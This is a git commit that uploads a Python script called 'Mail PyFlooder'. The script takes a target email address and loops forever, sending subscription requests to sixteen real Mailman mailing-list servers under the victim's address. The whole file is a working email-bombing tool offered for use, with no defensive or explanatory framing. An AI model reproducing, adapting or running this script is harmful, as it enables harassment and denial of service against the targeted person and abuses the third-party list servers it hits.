dfc57e661c78abd39e74b5893ab77dc7a7920a7c
Wolf7533 <101974081+Wolf7533@users.noreply.github.com>
2022-05-14 21:51:50 +0300

    Add files via upload

---
+++ mail.py
@@ -0,0 +1,34 @@
+import requests
+# =======================
+# |  Mail PyFlooder [!] |
+# |  Created by d_wf    |
+# =======================
+print('''
+    /\_____/\     ####### #     ###### ###### #####  ###### #####
+   /  o   o  \    #       #     #    # #    # #    # #      #    #
+  ( ==  ^  == )   ####    #     #    # #    # #    # #      #    #
+   )         (    #       #     #    # #    # #    # ####   #####
+  (           )   #       #     #    # #    # #    # #      #    #
+ ( (  )   (  ) )  #       ##### ###### ###### #####  ###### #    #
+(__(__)___(__)__) ===========[By D_WF]============================''')
+headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
+mail = input('Enter target e-mail (example: anonymous@example.com):')
+while True:
+ requests.get(url=f'https://google.com.ua'), print('[!] Flooder | @Reload... [!]')
+ requests.get(url=f'http://flybynews.com/mailman/subscribe/flybynews_flybynews.com?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #1| @Send message... [!]')
+ requests.get(url=f'http://www.winehq.org/mailman/subscribe/wine-users?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #2| @Send message... [!]')
+ requests.get(url=f'http://lists.gnupg.org/mailman/subscribe/gnupg-users?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #3| @Send message... [!]')
+ requests.get(url=f'http://lists.drupal.org/mailman/subscribe/development?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #4| @Send message... [!]')
+ requests.get(url=f'http://ogf.org/mailman/subscribe/occi-wg?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #5| @Send message... [!]') 
+ requests.get(url=f'http://list.blackcats.org.uk/mailman/subscribe/blackcats?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #6| @Send message... [!]')
+ requests.get(url=f'http://starj.com/mailman/subscribe/headlines_starj.com?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #7| @Send message... [!]')
+ requests.get(url=f'http://mail.etree.org/mailman/subscribe/etrade?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #8| @Send message... [!]')
+ requests.get(url=f'http://gator2004.hostgator.com/mailman/subscribe/gossip_queensoflasvegas.com?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #9| @Send message... [!]')
+ requests.get(url=f'http://noticias.livio.com/mailman/subscribe/notird_noticias.livio.com?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #10| @Send message... [!]')
+ requests.get(url=f'http://list.webaim.org/mailman/subscribe/webaim-forum?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #11| @Send message... [!]')
+ requests.get(url=f'http://www.orcas.net/mailman/subscribe/krahnos?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #12| @Send message... [!]')
+ requests.get(url=f'http://www.orcas.net/mailman/subscribe/lasvegasfur?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #13| @Send message... [!]')
+ requests.get(url=f'http://www.orcas.net/mailman/subscribe/networkoperations?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #14| @Send message... [!]')
+ requests.get(url=f'http://list.healthnet.org/mailman/subscribe/india-drug?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #15| @Send message... [!]')
+ requests.get(url=f'http://list.healthnet.org/mailman/subscribe/pronut-hiv?email={mail}&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe',headers=headers), print('[!] Flooder #16| @Send message... [!]')
+
